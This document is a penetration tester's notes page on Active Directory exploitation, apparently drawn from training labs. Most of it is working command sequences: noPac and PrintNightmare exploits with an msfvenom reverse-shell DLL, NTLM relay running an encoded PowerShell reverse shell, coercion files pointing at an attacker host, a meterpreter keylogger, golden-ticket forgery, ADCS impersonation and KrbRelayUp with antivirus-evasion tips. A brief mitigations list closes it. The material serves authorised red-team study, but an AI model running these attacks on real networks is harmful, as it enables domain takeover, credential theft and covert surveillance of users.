# Exploitation

* AD Delegation
* Forcing Authentication Relays
* Group Policy Objects
* Targeting AD Users
* Domain Trusts
* Silver and Golden Tickets

## Knowing Vulnerabilities

### SamAccountName (nopac) (CVE-2021-42287/CVE-2021-42278)

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.thehacker.recipes/a-d/movement/kerberos/samaccountname-spoofing
# Having user creds user:pwd on the domain, check if a host allows to add a computer
└─$ nxc smb sub.domain.local -u user -p password -M nopac
# If it says VULNERABLE, continue by creating a computer account
addcomputer.py -computer-name 'SomeName$' -computer-pass 'SomePassword' -dc-host "$DC_IP" -domain-netbios "$HOSTNAME" "$DOMAIN"/"$USER":"$PASSWORD"
# clear its SPNs ((with dirkjan krbrelayx tool addspn, not in Impacket)
addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'
# TO USE renameMachine.py we need to prepare Impacket first https://mayfly277.github.io/posts/GOADv2-pwning-part5/#prepare-impacket
# Rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DC_HOSTNAME' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
# Obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DC_HOSTNAME':'ComputerPassword'
# Reset the computer name back to its original name we set at the beginning
renameMachine.py -current-name 'DC_HOSTNAME' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
# Obtain a service ticket with S4U2self by presenting the previous TGT (another option is -impersonate Administrator)
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' -debug
# DCSync by presenting the service ticket
export KRB5CCNAME='DomainAdmin.ccache' 
secretsdump.py (-just-dc-user 'krbtgt') -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
# Finally we could clean up the computer account we added now that we have all the domain hashes ntds.dit
addcomputer.py -computer-name 'SomeName$' -delete -dc-host $DC_IP -domain-netbios $HOSTNAME -hashes 'NT:LM' 'domain.local/Administrator'
```
{% endcode %}

### PrintNightmare

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.thehacker.recipes/a-d/movement/print-spooler-service/printnightmare
# Check spooler is active (2 options)
nxc smb $IP -M spooler
rpcdump.py @$IP | egrep 'MS-RPRN|MS-PAR'
# Create a DLL payload (reverse shell in this example)
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll
# Host a SMB share 
smbserver.py -smb2support "WHATEVERNAME" /workspace/smb/
# Start the listener (for the reverse shell)
nc -lvnp $LOCAL_PORT
# Run the exploit
https://github.com/cube0x0/CVE-2021-1675
CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'
# Cleanup: delete the DLLs from these locations
C:\Windows\System32\spool\drivers\x64\3
C:\Windows\System32\spool\drivers\x64\3\Old\{id}\
```
{% endcode %}

## Permission Delegation

[https](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[**://**](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[bloodhound.readthedocs.io](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[**/**](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[en](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[**/**](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[latest](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[**/**](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[data-analysis](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[**/**](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)[edges.html#](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)

[https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)

[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

* **ForceChangePassword:** We have the ability to set the user's current password without knowing their current password.
* **AddMembers:** We have the ability to add users (including our own account), groups or computers to the target group.
* **GenericAll:** We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
* **GenericWrite:** We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
* **WriteOwner:** We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
* **WriteDACL:** We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
* **AllExtendedRights:** We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

{% code overflow="wrap" %}
```powershell
# NOTE: AD-RSAT toolset needed for this commands
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
Get-ADGroupMember -Identity "IT Support"
Get-ADGroupMember -Identity "Tier 2 Admins"
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
```
{% endcode %}

## Kerberos Delegation

The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server.

### Constrained vs Unconstrained

Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the "TRUSTED\_FOR\_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory. An attacker could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service.

[here](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)

To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised.

* HTTP - Used for web applications to allow pass-through authentication using AD credentials.
* CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
* LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
* HOST - Allows delegation of account for all activities on the host.
* MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

### Resource-Based Constrained Delegation

[https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it.

To configure RBCD for a service we can set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. To now gain access to the service, we can generate a TGT for the account we control.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Constrained Delegation Exploitation
# First enum the available delegations
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
# If a service account appears and we have those creds, we can perform Kerberos delegation attack with Kekeo and Mimikatz
# With Kekeo we generate our tickets (/user is the user with constrained delegation permissions)
PS C:\> C:\Tools\kekeo\x64\kekeo.exe
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted
# Having TGT now we forge TGS requests for the account we want to impersonate (/user) / NOTE: if there are several services such as WSMAN, HTTP, forge both
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
# Having the TGS, we import them on Mimikatz (pay attention to location path of the tickets)
mimikatz # privilege::debug
mimikatz # kerberos::ptt TGS_XXX.kirbi 
klist
# Once we verify tickets are imported with klist, we can create our PSSession:
PS C:> New-PSSession -ComputerName server.domain.com
PS C:\> Enter-PSSession -ComputerName server.domain.com
```
{% endcode %}

## Coerce with files

{% hint style="info" %}
This needs a bot/user that opens the share (does not need a click) and write permissions over a share to upload files.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.youtube.com/watch?v=b0lLxLJKaRs
https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/
https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land
https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/

nxc smb $IP -u $USER -p $PASS --shares # we find here a writable share

# slinky : .lnk file -> This module will drop an lnk file in every writable folder on the target server
nxc smb $IP -u $USER -p $PASS -M slinky -o NAME=thumbs.db SERVER=attacker_ip
# Now launch responder to be ready to catch NetNTLMv2 hash whenever a user clics on that .lnk file under the \\domain\share
# Obviously we could also do a ntlmrelayx to not smb signed server and get share access or admin access depending on the relayed authentication target.
# Cleanup
nxc smb $IP -u $USER -p $PASS -M slinky -o NAME=thumbs.db SERVER=attacker_ip CLEANUP=true

# .scf : scuffy (same as slinky but with scf file)
nxc smb $IP -u $USER -p $PASS -M scuffy -o NAME=thumbs.db SERVER=attacker_ip

# .url file
[InternetShortcut]
URL=http://click.me/pwned
WorkingDirectory=test
IconFile=\\ATTACKER_IP\share\file.icon
IconIndex=1
# Upload the file to the writable share and wait till that share is accessed by a user
```
{% endcode %}

## Webdav Coerce

{% code overflow="wrap" fullWidth="true" %}
```bash
# first let’s take a look if webdav is enable on servers:
nxc smb $IP_RANGE -u $USER -p $PASS  (-d domain.local) -M webdav
# We should see no webdav since the servic WebClient is stopped by default on Windows and not installed by default on Windows Server
# Now we will upload our malicous payload to the smb server with the name: myname.searchConnector-ms
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://whatever/</url>
</simpleLocation>
</searchConnectorDescription>
# Or we could also do that with the cme/nxc module drop-sc
nxc smb $IP -u $USER -p $PASS  (-d domain.local) -M drop-sc
# Now we run responder and if a user visits the share, the webdav service will start (we can check it running -M webdav again)
# now we will go on our responder CT to get the webdav coerce
#  Once the webclient started we can add a dns entry to our responder ip with dnstools:
dnstool.py -u 'domain.local\user' -p pass --record 'responder' --action add --data 10.10.10.6 192.168.10.11
# Now if we are in the same network we can try directly or if we are in another network we will have to wait for the dns.
# Next we use petitpotam on the server with webdav enabled to force a webdav (http) coerce to our server:
petitpotam.py -u 'user' -p pass -d 'domain.local' "responder@80/random.txt" $SERVER_IP_WITH_WEBDAV_ENABLED
# Another way if the victim can resolve your netbios name you will not have to add a dns entry an you can use the netbios name given by responder (responder machine name)
petitpotam.py -u 'user' -p pass -d 'domain.local' "WIN-6WQ7CSHQ2YG@80/random.txt" $SERVER_IP_WITH_WEBDAV_ENABLED
#     And on our responder listener we got a connection:
### NOTE: With an http coerce we can relay to ldap if ldap signing is not enforced (default). This can be use to interrogate ldap, do a shadow credentials attack, or to add a new computer and do an RBCD on the coerced host. 
```
{% endcode %}

## Impersonate Users - Token Impersonation

{% code overflow="wrap" fullWidth="true" %}
```bash
https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/
https://github.com/sensepost/impersonate
nxc smb $IP -u $USER -p $PASS  (-d domain.local) -M impersonate
# And we can launch command as the user:
nxc smb $IP -u $USER -p $PASS  (-d domain.local) -M impersonate -o TOKEN=$NUMBER EXEC=whoami
#    If you want to use other tools you can use @_zblurx rust implementation : https://github.com/zblurx/impersonate-rs
#    Or a csharp impersonation tool by S3cur3Th1sSh1t (@ShitSecure) : https://github.com/S3cur3Th1sSh1t/SharpImpersonation and the super nice blogpost with it : https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/
#    And if you already got an meterpreter session the incognito msf module is really nice too.

meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token \\$DOMAIN\$USER_TO_IMPERSONATE
meterpreter> execute -f cmd.exe -i -t
```
{% endcode %}

## RDP session hijacking

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
https://www.csoonline.com/article/3566917/rdp-hijacking-attacks-explained-and-how-to-mitigate-them.html
# NOTE: this does not work on Windows Server 2019 (and maybe on later versions neither)
# We need GUI connection and psexec to pass to SYSTEM
Psexec64.exe -s cmd.exe
#     Nex we will list the rdp session with 
query user
# If there is another user with an active RDP session, we can hijack it
tscon.exe $TARGET_ID /dest:$MY_SESSIONNAME
```
{% endcode %}

## Relay Attack

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.thehacker.recipes/a-d/movement/ntlm/relay
# The target is one (among) the servers w/o SMB Signing enforced / we relay an authentication request to another machine
# $TARGET_IP would be the external address facing the Internet
sudo ntlmrelayx.py --no-http-server -smb2support -t $TARGET_IP -c "powershell -enc JABjAGwAaQ..." # PS revshell
# Then on the target connect to our attacking machine using this syntax
//$ATTACKER_IP/$NON_EXISTENT_PATH
```
{% endcode %}

## Automated Relays

{% code overflow="wrap" fullWidth="true" %}
```powershell
# First we identify if a computer has admin privs over another computer with this custom query on Bloodhound
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p

# The Printer Bug -> what we need
1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.'
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

# Print Spooler Service -> verify the service is running
PS C:\> GWMI Win32_Printer -Computer server.domain.com
# If access denied, try
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
# If both are denied, take a leap of faith and assume the service is running

# SMB Signing -> confirm host does not have SMB signing enforced
nmap --script=smb2-security-mode -p445 server.domain.com # should see signing enabled but not required/enforced

# Exploiting Authentication Relays
# Note: This attack can be unstable. Abusing the Print Spooler service may cause it to crash, and a callback is not always guaranteed.
https://github.com/leechristensen/SpoolSample
ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
# Now we coerce SERVER2 to authenticate to SERVER1
C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
# With this we dump SERVER1 hashes
```
{% endcode %}

## AD Users

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Keylogger -> use meterpreter revshell, migrate to a process owned by the targeted user (e.g. explorer.exe) as otherwise keylogger being SYSTEM or other user will not work
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
meterpreter\>ps | grep "explorer"
meterpreter\>migrate $PID
meterpreter > getuid # confirm we are targeted user
meterpreter\>keyscan_start
# Wait some minutes (or hours/days, depending on the scenario) and then dump captured keystrokes
meterpreter\>keyscan_dump
```
{% endcode %}

## GPOs

Group Policy Object allows users to configure Windows policies. Group Policy Management is an AD feature that allows to configure GPOs for the entire AD structure.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# If we have a user with Generic Write on GPO -> access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
# To not look suspicious and RDP directly with a user account that might log the actual user out, we can use run as
C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe
C:\>mmc
# To verify the correct creds where provided, run this on the newly spawned console
dir \\za.tryhackme.loc\sysvol
# Then open the Microsoft Management Console 
C:\>mmc
# Now add the Group Policy Management snap-in
    Click File -> Add/Remove Snap-in
    Select the Group Policy Management snap-in and click Add
    Click Ok
# Navigate to the domain and specific GPO that our user can modify and then click on Edit
Expand Computer Configuration
Expand Policies
Expand Windows Settings
Expand Security Settings
Right Click on Restricted Groups and select Add Group
Add a group we already belong and make that group a member of (second textbox) the groups Administrators and Remote Desktop Users
By doing so our current user/group will have full privileges over that machine/host
```
{% endcode %}

## Certificates

[https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=46faae304292](https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=46faae304292)

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Finding Vulnerable Certificate Templates
https://github.com/GhostPack/PSPKIAudit
C:\>certutil -Template -v > templates.txt # look for key parameter combination said on the link/whitepaper

# Exploiting a Certificate Template
	Run mmc
	Click File->Add/Remove Snap-in..
    Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
We will request a personal certificate:
    Right Click on Personal and select All Tasks->Request New Certificate...
    Click Next twice to select the AD enrollment policy.
    You will see that we have one template that we can request, but first, we need to provide additional information.
    Click on the More Information warning.
    Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
    Change the Alternative name Type option to User principal name.
    Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.
The last step is to export our certificate with the private key:
    Right-click on the certificate and select All Tasks->Export...
    Click Next, select Yes, export the private key, and click Next.
    Click Next, then set a password for the certificate since the private key cannot be exported without a password.
    Click Next and select a location to store the certificate.
    Click Next and finally click Finish.
    
# User Impersonation through a Certificate
# 1 - Use the certificate to request a Kerberos ticket-granting ticket (TGT)
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:
# /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
# /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
# 2 - Load the Kerberos TGT 
mimikatz # privilege::debug
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # exit
C:\>dir \\THMDC.za.tryhackme.loc\c$\
```
{% endcode %}

## Domain Trusts

* Directional (by default) - The direction of the trust flows from a trusting domain to a trusted domain
* Transitive - The trust relationship expands beyond just two domains to include other trusted domains

When we compromise a child domain (sub.domain.com) and we want to compromise the parent domain (domain.com).

{% code overflow="wrap" fullWidth="true" %}
```powershell
# KRBTGT and Golden Tickets
In order to forge TGTs, we need the following information:
    The FQDN of the domain
    The Security Identifier (SID) of the domain
    The username of the account we want to impersonate
    The KRBTGT password hash
The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. 
# Dump KRBTGT from DC
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:SUBDOMAIN\krbtgt

# Inter-Realm TGTs -> TGT to provide access to other domains. For this we need Enterprise Admins (S-1-5-21-<RootDomain>-519)
we first need to recover two SIDs:
    The SID of the child domain controller (DC), which we will impersonate in our forged TGT
    The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT
PS C:\> Get-ADComputer -Identity "THMDC" # using the AD-RSAT Powershell cmdlets
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc

# Exploiting Domain Trusts -> generate Golden Ticket with Mimikatz
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:sub.domain.com /sid:<DC SID> /service:krbtgt /rc4:<krbtgt hash> /sids:<SID of Enterprise Admins group> /ptt
# Verify it is a valid ticket for the child domain
C:\>dir \\thmdc.za.tryhackme.loc\c$ # PC/hostname.domain.com
# since we specified extra SIDs, we should also now have access to the parent DC
C:\>dir \\thmrootdc.tryhackme.loc\c$\ # PC/hostname.domain.com
```
{% endcode %}

## KrbRelayUp

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/Dec0ne/KrbRelayUp
https://kb.offsec.nl/tools/techniques/krbrelayup/files/KrbRelayUp.exe
As KrbRelayUp is detected by defender, we will use the step by step approach like this writeup by @an0n_r0, using @cube0x0 KrbRelay

# The conditions to exploit this privesc is LDAP signing is NOT enforced
nxc ldap $IPs -u user -p pass -d dc.domain.local -M ldap-checker

####### Without AV or if you modify/obfuscate KrbRelayUp, you can do the all things with just the following commands
# First, the authenticated users w/o privs will relay a Kerberos request to LDAP and will create a computer
.\KrbRelayUp.exe relay -Domain <Domain> -CreateNewComputerAccount -ComputerName <hostName>$ -ComputerPassword <Password>
# Then this new computer will be used to request a TGT that will be used to create a new service as SYSTEM
.\KrbRelayUp.exe spawn (m -rbcd) -d <Domain> (-dc <DC-domain> ) -cn <HostName>$ -cp <Password>

########## IN CASE OF AV, IT HAS TO BE DONE STEP BY STEP LIKE THIS
# We need to add a computer, we can check if we can with MAQ module
nxc ldap $IP -u user -p pass -d dc.domain.local -M maq
# If MachineAccountQuota is > 0 then we can add a new computer
addcomputer.py -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
# Get computer's SID
PS C:\Users\jon.snow\Desktop> $o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID
PS C:\Users\jon.snow\Desktop> (New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
S-1-5-21-3469228063-1577654746-3345322900-1127
# Check ports
PS C:\Users\jon.snow\Desktop> .\CheckPort.exe
[*] Looking 'for' available ports..
[*] SYSTEM Is allowed through port 443
# Launch KrbRelay
PS C:\Users\jon.snow\Desktop> .\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-3469228063-1577654746-3345322900-1127 -port 443
# Now we finish with RCBD
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPassword'
export KRB5CCNAME=/workspace/krbrelay\$.ccache
getST.py -impersonate 'administrator' -spn 'CIFS/castelblack.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$'
export KRB5CCNAME=/workspace/administrator@CIFS_castelblack.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
wmiexec.py -k @castelblack.north.sevenkingdoms.local
C:\>whoami
north\administrator
# And just like the writeup made by @an0n_r0 we launch SCMUACBypass.exe by Tyranid and get a system shell
https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
```
{% endcode %}

## Mitigations

* We need to ensure that no configuration breaks our tiering model. Accounts in a lower tier should not have the ability to interact with resources in a higher tier. Furthermore, accounts from a higher tier should never log onto resources in a lower tier.
* The principle of least privilege should be followed when permission delegation is performed. Furthermore, permission delegation should adhere to the tiering model, ensuring that a lower-tiered object can't alter a higher tiered object.
* SMB signing should be enforced, not just enabled. This will prevent credential relay attempts.
* AD objects and their configuration are not the only paths for exploitation. AD services, such as AD CS should also be considered part of the attack surface and secured.
* We need to implement sufficient security controls to protect Tier 0 infrastructure and accounts in our child domains since a compromise of one can lead to the compromise of the entire forest.
